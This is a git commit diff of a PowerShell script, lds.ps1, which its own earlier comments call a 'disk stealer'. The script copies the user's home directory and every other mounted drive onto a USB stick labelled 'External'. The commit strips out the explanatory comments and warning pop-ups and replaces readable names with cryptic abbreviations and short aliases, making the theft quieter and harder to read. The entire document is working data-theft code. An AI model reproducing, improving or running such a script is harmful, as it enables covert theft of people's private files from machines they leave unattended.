f5384ad10f29b7f85c29e6f888cd9606036b4eab
LucaReggiannini <46603573+LucaReggiannini@users.noreply.github.com>
2020-06-16 11:32:52 +0200

    Update lds.ps1

--- lds.ps1
+++ lds.ps1
@@ -1,17 +1,8 @@
-[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); # Verbose; Remove
-[System.Windows.Forms.MessageBox]::Show("LDS process starting: do not remove USB drives; do not power-off the machine!","LDS",0 ,48); # Verbose; Remove
-
-# Settings
-$disk_stealer_label = "External";
-$items_to_exclude_from_copy = @('MicrosoftEdgeBackups','AppData','Musica');
-
-# Get the mountpoint of the disk used to steal data and copy data from disk "C" (ignoring items from the list $items_to_exclude_from_copy)
-$disk_stealer = Get-WmiObject -Class Win32_logicaldisk | Where-Object { $_.VolumeName -Like "*$disk_stealer_label*" } | select DeviceID | foreach { $_.DeviceID };
-Get-ChildItem $home -Recurse -Exclude $items_to_exclude_from_copy | Copy-Item -Destination {Join-Path ($disk_stealer + "/" + $env:UserName + "_C/") $_.FullName.Substring($home.length)}
-
-[System.Windows.Forms.MessageBox]::Show("LDS: main disk OK. Wait for others mountpoints...","LDS",0 ,48); # Verbose; Remove
-
-# Get every other mountpoint excluding disk "C" and stealer disk. Copy everything 
-$disk_other = Get-WmiObject -Class Win32_logicaldisk | Where-Object {  $_.DeviceID -NotLike "*C*" } | Where-Object { $_.DeviceID -NotLike "*$disk_stealer*" } | select DeviceID | foreach { $_.DeviceID };
-$disk_other | foreach  { Copy-Item -Path $_ -Destination ($disk_stealer + "/" + $env:UserName + "_" + $_).TrimEnd(':') -Recurse }
-[System.Windows.Forms.MessageBox]::Show("LDS process completed","LDS",0 ,48); # Verbose; Remove
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
+$dsl = "External";
+$itefc = @('MicrosoftEdgeBackups','AppData','Musica');
+$ds = gwmi -Class Win32_logicaldisk | ? { $_.VolumeName -Like "*$dsl*" } | select DeviceID | % { $_.DeviceID };
+gci $home -Recurse -Exclude $itefc | cpp -Destination {Join-Path ($ds + "/" + $env:UserName + "_C/") $_.FullName.Substring($home.length)}
+$do = gwmi -Class Win32_logicaldisk | ? {  $_.DeviceID -NotLike "*C*" } | ? { $_.DeviceID -NotLike "*$ds*" } | select DeviceID | % { $_.DeviceID };
+$do | % { cpp -Path $_ -Destination ($ds + "/" + $env:UserName + "_" + $_).TrimEnd(':') -Recurse }
+[System.Windows.Forms.MessageBox]::Show("Process completed","LDS",0 ,48); 
